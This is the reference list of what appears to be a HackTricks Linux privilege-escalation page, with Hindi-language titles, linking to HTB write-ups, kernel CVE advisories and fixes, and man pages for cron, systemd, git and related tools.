{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – user-writable PaperCut directory में root द्वारा चलाए जाने वाले script को hijack करना](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 के लिए Openwall oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place operation पर वापस लौटें](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE Variant DirtyClone (CVE-2026-43503) का विश्लेषण और exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()` में `SKBFL_SHARED_FRAG` को सुरक्षित रखें (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux का पहले का mitigation: spliced UDP packets के लिए `SKBFL_SHARED_FRAG` सेट करें (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator documentation](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: persistence mechanisms](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
